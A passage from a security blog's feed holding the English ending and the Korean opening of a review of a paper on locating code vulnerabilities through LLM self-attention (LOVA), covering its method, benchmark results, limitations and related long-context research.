accurate to compare it with the attention patterns of the preceding and following lines (B, C). In other words, it considers the context of the entire code in both directions.</li><li>The model ultimately outputs a &#x201C;suspicious score&#x201D; between 0 and 1 for each line, and if this score exceeds 0.5, it is judged to be vulnerable code.</li></ol><h1 id="4-Results"><a href="#4-Results" class="headerlink" title="4. Results"></a>4. Results</h1><p>The tests were conducted using the Big-Vul, SmartFix, and CVEFixes benchmarks, utilizing models with 10B or less, such as Llama-3.1-8B-Instruct, Mistral-7B-Instruct-v0.2, and Phi3.5-mini-instruct.</p><ul><li>LOVA demonstrated superior vulnerability location identification capabilities compared to existing LLM direct output methods, achieving up to a 5x performance improvement based on F1-score, especially in long code contexts.</li><li>LOVA achieved excellent vulnerability location identification results across various programming languages, showing up to a 14.6x improvement.</li><li>LOVA is applicable to various LLM architectures and shows consistent results.</li></ul><p>Overall, it shows impressive performance. It was also good to compare it with various techniques such as CoT, MoA, and rStar, assuming that the same model was used. Above all, I think the attempt to use the self-attention mechanism for vulnerability detection for the first time is meaningful.</p><h1 id="5-Areas-for-improvement"><a href="#5-Areas-for-improvement" class="headerlink" title="5. Areas for improvement"></a>5. Areas for improvement</h1><ol><li>Lack of comparison with larger models<ul><li>This paper tested using Llama-3.1-8B-Instruct, Mistral-7B-Instruct-v0.2, and Phi3.5-mini-instruct, but there is no comparison with larger models.<ul><li>To use the method described in this paper, an attention matrix must be created for each code line, which increases the time required and the number of matrices to be computed. I suspect that the hardware was insufficient to handle larger models.</li><li>In that case, it might be worth comparing it with the vanilla output of a larger model. (Oh, maybe I should try that myself&#x2026;) Even if it only comes out as &#x201C;comparable to the vanilla output of a larger model,&#x201D; it would still be meaningful, right?</li></ul></li></ul></li><li>Lack of comparison of power efficiency or computational cost<ul><li>LOVA highlights each code line individually to generate multiple versions of prompts, calculates the differences in attention maps between them, and goes through several other steps. Additionally, dimension reduction and the use of a Bi-LSTM classifier can increase complexity.<ul><li>This paper lacks mention of the time and financial costs incurred when applied to actual large-scale software projects. While dataset comparisons are useful for performance comparisons, it would be helpful to include measurements of how much additional computation is required as the amount of code increases. (The paper mentions that contexts exceeding 4,000 tokens were filtered to comply with LLM input constraints.)</li></ul></li></ul></li></ol><p>Well&#x2026; I&#x2019;ll wrap up this post here. I considered developing it further into a second part&#x2026; but my current life won&#x2019;t allow it. Haha. Then I&#x2019;ll be back for the next part! (Now I really need to watch Usenix&#x2026;)</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM/">LLM</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Security/">LLM Security</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Safety/">LLM Safety</category>
      
      <category domain="https://hackyboiz.github.io/tags/Transformer/">Transformer</category>
      
      <category domain="https://hackyboiz.github.io/tags/Attention/">Attention</category>
      
      <category domain="https://hackyboiz.github.io/tags/Automated-vulnerability-Detection/">Automated vulnerability Detection</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] LLM Security &amp; Safety Part 3. “Attention Is All You Need for LLM-based Code Vulnerability Localization” Review (KR)</title>
      <link>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/kr/</link>
      <guid>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/kr/</guid>
      <pubDate>Mon, 11 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;1-&amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;a href=&quot;#1-&amp;#xC11C;&amp;#xB860;&quot; class=&quot;headerlink&quot; title=&quot;1. &amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;/a&gt;1. &amp;#xC11C;&amp;#xB860;&lt;/h1&gt;&lt;p&gt;&amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-&#xC11C;&#xB860;"><a href="#1-&#xC11C;&#xB860;" class="headerlink" title="1. &#xC11C;&#xB860;"></a>1. &#xC11C;&#xB860;</h1><p>&#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xB610; &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;&#xB85C; &#xB3CC;&#xC544;&#xC628; j0ker&#xC785;&#xB2C8;&#xB2E4;! &#xC6D0;&#xB798; &#xD300;&#xC5D0;&#xB294; &#x201C;&#xC774;&#xBC88; Usenix &#xB17C;&#xBB38;&#xB4E4; &#xC804;&#xCCB4;&#xB97C; LLM&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xD2B8;&#xB79C;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xBCFC;&#xAC70;&#xC57C;!&#x201D;&#xB77C;&#xACE0; &#xD588;&#xC9C0;&#xB9CC;&#x2026; &#xB124;&#x2026; &#xC5B4;&#xB9BC;&#xB3C4; &#xC5C6;&#xC5C8;&#xC8E0;? &#xC5ED;&#xC2DC; &#xD604;&#xC0DD;&#xC740; &#xB9CC;&#xB9CC;&#xCE58; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/11/j0ker/llm_part3/kr/1.jpg" alt="index_img"></p><blockquote><p>&#xB178;&#xC608;&#xB294;&#x2026;. &#xC5B8;&#xC81C;&#xCBE4; &#xD589;&#xBCF5;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#x2026;?</p></blockquote><p>&#xADF8;&#xB798;&#xC11C; &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xB17C;&#xBB38; &#xD55C;&#xD3B8;&#xC744; &#xAC00;&#xC838;&#xC640; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xBC88; &#xB17C;&#xBB38;&#xC740; &#x201C;&#xC544; &#xB204;&#xAD6C;&#xB098; &#xC0DD;&#xAC01;&#xD560; &#xBC95;&#xD55C;&#xAC78; &#xD588;&#xB124;&#x201D;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xC774; &#xB4E4;&#xC5C8;&#xB2E4;&#xBA74; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#x201C;&#xC624; &#xC598;&#xB294; &#xC880; &#xB2E4;&#xB974;&#xAD70;&#x201D;&#xC774;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xBC14;&#xB85C; &#xB4E4;&#xC5C8;&#xB358; &#xB17C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xB17C;&#xBB38;&#xB4E4;&#xC740; &#xD504;&#xB86C;&#xD504;&#xD305;, RAG &#xB4F1;&#xC744; &#xD1B5;&#xD574; LLM&#xC758; &#xCD94;&#xB860; &#xC544;&#xC6C3;&#xD48B;&#xC5D0; &#xC9D1;&#xC911;&#xD588;&#xB2E4;&#xBA74; &#xC774; &#xB17C;&#xBB38;&#xC740; LLM&#xC758; &#xAD6C;&#xC870; &#xC790;&#xCCB4;&#xB97C; &#xD65C;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xB208;&#xC5D0; &#xB744;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC14;&#xB85C; 2024&#xB144; 10&#xC6D4;&#xC5D0; Arxiv&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#x201C;<a href="https://arxiv.org/html/2410.15288v1">Attention Is All You Need for LLM-based Code Vulnerability Localization</a>&#x201D; &#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB85C; &#xC5B4;&#xB290; &#xD559;&#xD68C;&#xC5D0; &#xD22C;&#xACE0;&#xD558;&#xC9C0;&#xB294; &#xC54A;&#xACE0; &#xC544;&#xCE74;&#xC774;&#xBE0C;&#xC5D0;&#xB9CC; &#xC62C;&#xB9B0;&#xAC83; &#xAC19;&#xC740;&#xB370;&#xC694;. &#xC544;&#xC774;&#xB514;&#xC5B4; &#xC790;&#xCCB4;&#xB294; &#xAD1C;&#xCC2E;&#xC9C0;&#xB9CC; &#xC544;&#xB9C8; &#xACB0;&#xB860; &#xBD80;&#xBD84;&#xC774; &#xC880; &#xC544;&#xC27D;&#xC9C0; &#xC54A;&#xB098; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="2-&#xB17C;&#xBB38;-&#xB9AC;&#xBDF0;"><a href="#2-&#xB17C;&#xBB38;-&#xB9AC;&#xBDF0;" class="headerlink" title="2. &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;"></a>2. &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;</h1><p>&#x201C;Attention Is All You Need for LLM-based Code Vulnerability Localization&#x201D;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB2E4;&#xC2DC;&#xD53C; &#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; LLM&#xC758; self-attention &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810; &#xC704;&#xCE58;&#xB97C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xC8FC;&#xC694; &#xACE8;&#xC790;&#xC785;&#xB2C8;&#xB2E4;. &#x201C;<a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a>&#x201D;&#xB77C;&#xB294; &#xD604;&#xC7AC; LLM&#xC758; &#xAE30;&#xBC18;&#xC774; &#xB418;&#xB294; &#xB17C;&#xBB38;&#xC744; &#xC624;&#xB9C8;&#xC8FC;&#xD588;&#xB2E4;&#xB294; &#xAC83;&#xB3C4; &#xB9E4;&#xC6B0; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xD3EC;&#xC778;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;</p><h2 id="2-1-&#xAE30;&#xC874;-&#xBC29;&#xBC95;&#xB4E4;&#xC758;-&#xD55C;&#xACC4;"><a href="#2-1-&#xAE30;&#xC874;-&#xBC29;&#xBC95;&#xB4E4;&#xC758;-&#xD55C;&#xACC4;" class="headerlink" title="2.1 &#xAE30;&#xC874; &#xBC29;&#xBC95;&#xB4E4;&#xC758; &#xD55C;&#xACC4;"></a>2.1 &#xAE30;&#xC874; &#xBC29;&#xBC95;&#xB4E4;&#xC758; &#xD55C;&#xACC4;</h2><h3 id="1-Lost-in-the-Middle"><a href="#1-Lost-in-the-Middle" class="headerlink" title="1) Lost in the Middle"></a>1) Lost in the Middle</h3><p>&#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xB0B4;&#xC6A9;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC804;, &#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xC9C0;&#xC801;&#xD558;&#xB294; LLM&#xC774; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC9C0;&#xC5D0;&#xC11C; &#xAC00;&#xC9C0;&#xB294; &#xAC00;&#xC7A5; &#xD070; &#xD55C;&#xACC4;&#xC810;&#xC740; &#x201C;&#xAE34; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xC758; &#xCD94;&#xB860; &#xC815;&#xD655;&#xB3C4; &#xAC10;&#xC18C;&#x201D;&#xC785;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xAC00; 300&#xC904;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xAE30; &#xC2DC;&#xC791;&#xD558;&#xBA74; &#xC815;&#xD655;&#xB3C4;&#xB294; 5% &#xBBF8;&#xB9CC;&#xC73C;&#xB85C; &#xB0B4;&#xB824;&#xAC04;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/11/j0ker/llm_part3/kr/2.png" alt="index_img"></p><p>&#xB610;&#xD55C; &#xADFC;&#xAC70;&#xB85C; &#xC81C;&#xC2DC;&#xD55C; &#xB17C;&#xBB38;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://arxiv.org/pdf/2307.03172">Lost in the Middle: How Language Models Use Long Contexs</a></li><li><a href="https://arxiv.org/pdf/2406.10149">BABILong: Testing the Limits of LLMs with Long Context Reasoning-in-a-Haystack</a></li></ul><p>&#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xB4E4; &#xC774; &#xAE00;&#xC744; &#xC77D;&#xC73C;&#xBA74;&#xC11C; &#xB610; &#xB17C;&#xBB38;&#xC744; &#xC77D;&#xACE0; &#xC2F6;&#xC9C0;&#xB294; &#xC54A;&#xC73C;&#xC2DC;&#xACA0;&#xC8E0;? &#xD55C; &#xC720;&#xD29C;&#xBE0C; &#xCC44;&#xB110;&#xC5D0;&#xC11C; &#xC720;&#xC0AC;&#xD55C; &#xC8FC;&#xC81C;&#xB97C; &#xB2E4;&#xB8EC; &#xC601;&#xC0C1;&#xC774; &#xC788;&#xC5B4; &#xC774;&#xAC78; &#xBCF4;&#xC154;&#xB3C4; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://www.youtube.com/watch?v=EbN_DWM3DJc">OpenAI, &#xAD6C;&#xAE00;, &#xD074;&#xB85C;&#xB4DC; &#xB2E4; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#x2026; &#xC785;&#xB825; &#xAE38;&#xC774; &#xAE38;&#xC5B4;&#xC9C0;&#xBA74; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xB354; &#xC131;&#xB2A5; &#xB5A8;&#xC5B4;&#xC9C4;&#xB2E4; - &#xC5B4;&#xB5BB;&#xAC8C; &#xB300;&#xC751;&#xD574;&#xC57C; &#xD558;&#xB098; | &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;</a></li></ul><p>&#xC704; &#xB0B4;&#xC6A9;&#xB4E4;&#xC744; &#xC790;&#xC138;&#xD788; &#xC77D;&#xC5B4;&#xBCF4;&#xC9C0;&#xB294; &#xC54A;&#xC558;&#xC9C0;&#xB9CC; &#xD575;&#xC2EC; &#xB0B4;&#xC6A9;&#xACFC; &#xAD00;&#xB828;&#xC5C6;&#xB294; &#xD1A0;&#xD070;&#xC774; &#xB9CE;&#xC544;&#xC9D0;&#xC5D0; &#xB530;&#xB77C; &#xC5B4;&#xD150;&#xC158;&#xD574;&#xC57C; &#xD560; &#xB0B4;&#xC6A9;&#xB4E4;&#xC5D0; &#xC815;&#xD655;&#xD788; &#xC5B4;&#xD150;&#xC158;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC70;&#xB098; &#xD558;&#xB294; &#xB4F1;&#xC758; &#xBB38;&#xC81C;&#xC77C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xB294; LLM &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xB9CE;&#xC774; &#xC368;&#xBCF4;&#xC2DC;&#xACE0;, &#xD2B9;&#xD788; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9;&#xC744; &#xC704;&#xD574; &#xAE34; &#xCF54;&#xB4DC;&#xB4E4;&#xC744; &#xB123;&#xC5B4;&#xBCF4;&#xC2E0; &#xBD84;&#xB4E4;&#xC774;&#xB77C;&#xBA74; &#xB2E4;&#xB4E4; &#xD55C; &#xBC88;&#xC529;&#xC740; &#xACAA;&#xC5B4;&#xBCF4;&#xC168;&#xC744; &#xBB38;&#xC81C;&#xC77C; &#xAC81;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC; &#xD568;&#xC218;&#xC5D0; &#xAC78;&#xCCD0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC544;&#xB2EC;&#xB77C;&#xACE0; &#xD558;&#xBA74; &#xCF54;&#xB4DC;&#xB97C; &#xAE4C;&#xBA39;&#xAC70;&#xB098; &#xAE30;&#xC5B5;&#xC744; &#xBABB;&#xD55C;&#xB2E4;&#xAC70;&#xB098; &#xD558;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB4E4;&#xC740; (&#xCCB4;&#xAC10;&#xC801;&#xC73C;&#xB85C;)&#xC791;&#xB144; &#xB9D0; ~ &#xC62C;&#xD574; &#xCD08;&#xBD80;&#xD130; &#xB9CE;&#xC774; &#xB098;&#xC544;&#xC9C0;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xB290;&#xB07C;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB7F0; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xAC1C;&#xC120;&#xD560; &#xC218; &#xC788;&#xB294; &#xB17C;&#xBB38;&#xB4E4;&#xB3C4; &#xB098;&#xC624;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>(&#xC5EC;&#xAE30;&#xB294; LLM&#xC774; &#xCC3E;&#xC544;&#xC900; &#xC815;&#xBCF4;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;)</p><ol><li>&#xC704;&#xCE58;&#xC5D0; &#xC0C1;&#xAD00;&#xC5C6;&#xC774; &#xC815;&#xBCF4;&#xB97C; &#xCC3E;&#xB294; &#xD6C8;&#xB828; &#xBC29;&#xC2DD;<ul><li><strong>&#x201C;Never Lost in the Middle: Mastering Long-Context Question Answering with Position-Agnostic Decompositional Training&#x201D; (2024)</strong><ul><li><strong>&#xD575;&#xC2EC; &#xB0B4;&#xC6A9;:</strong> &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; <strong>&#x2018;&#xC704;&#xCE58;&#xC5D0; &#xAD6C;&#xC560;&#xBC1B;&#xC9C0; &#xC54A;&#xB294; &#xBD84;&#xD574; &#xD6C8;&#xB828;(Position-Agnostic Decompositional Training)&#x2019;</strong> &#xC774;&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD6C8;&#xB828; &#xBC29;&#xBC95;&#xC744; &#xC81C;&#xC548;&#xD569;&#xB2C8;&#xB2E4;. &#xAE34; &#xC9C8;&#xBB38;&#xC744; &#xC5EC;&#xB7EC; &#xB2E8;&#xACC4;&#xC758; &#xC9E7;&#xC740; &#xC9C8;&#xBB38;&#xC73C;&#xB85C; &#xBD84;&#xD574;&#xD558;&#xACE0;, &#xC815;&#xB2F5;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC591;&#xD558;&#xAC8C; &#xC11E;&#xC5B4;&#xC11C; &#xBAA8;&#xB378;&#xC744; &#xD6C8;&#xB828;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD574;&#xACB0; &#xBC29;&#xC2DD;:</strong> &#xBAA8;&#xB378;&#xC774; &#xC815;&#xBCF4;&#xC758; &#x2018;&#xC704;&#xCE58;&#x2019;&#xC5D0; &#xC758;&#xC874;&#xD558;&#xB294; &#xD3B8;&#xD5A5;&#xC744; &#xC904;&#xC774;&#xACE0;, &#xBB38;&#xB9E5; &#xC5B4;&#xB514;&#xC5D0; &#xC788;&#xB4E0; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xCC3E;&#xC544;&#xB0B4;&#xB294; &#xB2A5;&#xB825;&#xC744; &#xAC15;&#xD654;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li><li>&#xC785;&#xB825; &#xB370;&#xC774;&#xD130;&#xC758; &#xAD6C;&#xC870; &#xBCC0;&#xACBD;<ul><li><strong>&#x201C;Structured Packing in LLM Training Improves Long Context Utilization&#x201D; (2023)</strong><ul><li><strong>&#xD575;&#xC2EC; &#xB0B4;&#xC6A9;:</strong> &#xC5EC;&#xB7EC; &#xBB38;&#xC11C;&#xB97C; &#xB2E8;&#xC21C;&#xD788; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC774;&#xC5B4; &#xBD99;&#xC5EC; &#xD6C8;&#xB828;&#xC2DC;&#xD0A4;&#xB294; &#xB300;&#xC2E0;, &#xAD00;&#xB828; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB97C; &#xAD6C;&#xC870;&#xC801;&#xC73C;&#xB85C; &#xBB36;&#xC5B4;&#xC11C;(packing) &#xBAA8;&#xB378;&#xC5D0; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC81C;&#xC548;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD574;&#xACB0; &#xBC29;&#xC2DD;:</strong> &#xC815;&#xBCF4;&#xC758; &#xB17C;&#xB9AC;&#xC801; &#xC5F0;&#xACB0;&#xC131;&#xC744; &#xAC15;&#xD654;&#xD558;&#xC5EC; &#xBAA8;&#xB378;&#xC774; &#xBB38;&#xB9E5; &#xC911;&#xAC04;&#xC5D0; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB77C;&#xB3C4; &#xADF8; &#xC911;&#xC694;&#xC131;&#xC744; &#xB354; &#xC798; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xD65C;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xB3D5;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li><li>&#xC5B4;&#xD150;&#xC158; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xAC1C;&#xC120;<ul><li><strong>&#x201C;Mixture-of-Recursions: Learning Dynamic Recursive Depths for Adaptive Token-Level Computation&#x201D; (2025)</strong><ul><li><strong>&#xD575;&#xC2EC; &#xB0B4;&#xC6A9;:</strong> &#xBAA8;&#xB4E0; &#xD1A0;&#xD070;&#xC744; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB300;&#xC2E0; &#x2018;&#xB77C;&#xC6B0;&#xD130;&#x2019;&#xB97C; &#xD1B5;&#xD574; &#xC911;&#xC694;&#xD55C; &#xD1A0;&#xD070;&#xC744; &#xC2DD;&#xBCC4;&#xD558;&#xACE0;, &#xD574;&#xB2F9; &#xD1A0;&#xD070;&#xC5D0; &#xB354; &#xB9CE;&#xC740; &#xC5F0;&#xC0B0;&#xC744; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xD558;&#xB294; <strong>MoR(Mixture-of-Recursions)</strong> &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC81C;&#xC548;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD574;&#xACB0; &#xBC29;&#xC2DD;:</strong> &#xC815;&#xBCF4;&#xC758; &#xC704;&#xCE58;&#xAC00; &#xC544;&#xB2CC; &#xC911;&#xC694;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; &#xCEF4;&#xD4E8;&#xD305; &#xC790;&#xC6D0;&#xC744; &#xC9D1;&#xC911;&#xD558;&#xC5EC;, &#xBB38;&#xB9E5; &#xC911;&#xAC04;&#xC5D0; &#xC788;&#xB294; &#xD575;&#xC2EC; &#xC815;&#xBCF4;&#xB3C4; &#xB193;&#xCE58;&#xC9C0; &#xC54A;&#xACE0; &#xAE4A;&#xC774; &#xC788;&#xAC8C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li><li>&#xAC80;&#xC0C9; &#xC99D;&#xAC15; &#xC0DD;&#xC131;(RAG)&#xACFC;&#xC758; &#xACB0;&#xD569; &#xBC0F; &#xBE44;&#xAD50;<ul><li><strong>&#x201C;Long Context vs. RAG for LLMs: An Evaluation and Revisits&#x201D; (2025)</strong><ul><li><strong>&#xD575;&#xC2EC; &#xB0B4;&#xC6A9;:</strong> &#xAE34; &#xBB38;&#xB9E5;&#xC744; &#xD1B5;&#xC9F8;&#xB85C; &#xC785;&#xB825;&#xD558;&#xB294; &#xBC29;&#xC2DD;(Long Context)&#xACFC; &#xC678;&#xBD80; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB9CC; &#xAC80;&#xC0C9;&#xD574;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; RAG(Retrieval-Augmented Generation) &#xBC29;&#xC2DD;&#xC744; &#xBE44;&#xAD50; &#xBD84;&#xC11D;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD574;&#xACB0; &#xBC29;&#xC2DD;:</strong> RAG&#xB294; &#xC560;&#xCD08;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB9CC; &#x2018;&#xAC80;&#xC0C9;&#x2019;&#xD574;&#xC11C; &#xBB38;&#xB9E5;&#xC758; &#xC55E;&#xBD80;&#xBD84;&#xC5D0; &#xC81C;&#xC2DC;&#xD558;&#xBBC0;&#xB85C;, &#x201C;Lost in the Middle&#x201D; &#xBB38;&#xC81C;&#xB97C; &#xC6D0;&#xCC9C;&#xC801;&#xC73C;&#xB85C; &#xD68C;&#xD53C;&#xD558;&#xB294; &#xD6A8;&#xACFC;&#xC801;&#xC778; &#xB300;&#xC548;&#xC774; &#xB420; &#xC218; &#xC788;&#xC74C;&#xC744; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC;, &#xC5B4;&#xB5A4; &#xBC29;&#xC2DD;&#xC774; &#xB354; &#xC6B0;&#xC6D4;&#xD55C;&#xC9C0;&#xB294; &#xD0DC;&#xC2A4;&#xD06C;&#xC758; &#xC885;&#xB958;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9C4;&#xB2E4;&#xACE0; &#xBD84;&#xC11D;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li></ol><p>&#xC704; &#xB17C;&#xBB38;&#xB4E4;&#xC744; &#xBCF4;&#xBA74; &#xD6C8;&#xB828; &#xACFC;&#xC815;, &#xD6C8;&#xB828; &#xB370;&#xC774;&#xD130;&#xC14B;, &#xC5B4;&#xD150;&#xC158; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;, &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xBC29;&#xBA74;&#xC5D0;&#xC11C; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC5F0;&#xAD6C;&#xB97C; &#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-&#xC815;&#xD655;&#xB3C4;"><a href="#2-&#xC815;&#xD655;&#xB3C4;" class="headerlink" title="2) &#xC815;&#xD655;&#xB3C4;"></a>2) &#xC815;&#xD655;&#xB3C4;</h3><p>LLM&#xC758; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xBB38;&#xC81C;&#xC810;&#xC778; &#xCD9C;&#xB825; &#xACB0;&#xACFC;&#xC758; &#xC815;&#xD655;&#xB3C4; &#xC785;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xCC98;&#xC74C; ChatGPT 3.5&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC744; &#xB54C;&#xBCF4;&#xB2E4;&#xB294; &#xD6E8;&#xC52C; &#xB098;&#xC544;&#xC84C;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; &#xC624;&#xD0D0;&#xACFC; &#xBBF8;&#xD0D0; &#xBB38;&#xC81C;&#xB294; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACE0;&#xAE09; reasoning &#xAE30;&#xBC95;&#xB4E4;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://arxiv.org/pdf/2203.11171">SELF-CONSISTENCY IMPROVES CHAIN OF THOUGHT REASONING IN LANGUAGE MODELS</a></li><li><a href="https://arxiv.org/pdf/2408.06195">MUTUAL REASONING MAKES SMALLER LLMS STRONGER PROBLEM-SOLVERS</a></li></ul><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB7F0; &#xACE0;&#xAE09; &#xD504;&#xB86C;&#xD504;&#xD305;, CoT &#xAE30;&#xBC95;&#xB4E4;&#xB3C4; &#xBAA8;&#xB450; stochastic decoding&#xC5D0; &#xC758;&#xC9C0;&#xD574; &#xC5EC;&#xB7EC; &#xCD9C;&#xB825;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xB2E4;&#xC218;&#xACB0; 